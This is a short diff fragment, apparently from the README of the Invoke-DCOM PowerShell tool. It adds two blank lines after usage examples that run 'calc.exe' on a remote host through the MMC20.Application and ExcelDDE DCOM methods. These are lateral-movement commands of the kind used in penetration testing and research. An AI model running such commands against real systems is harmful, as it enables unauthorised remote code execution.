@@ -20,3 +20,5 @@ Import-Module .\Invoke-DCOM.ps1
 Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
 Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command "calc.exe"
 ```
+
+
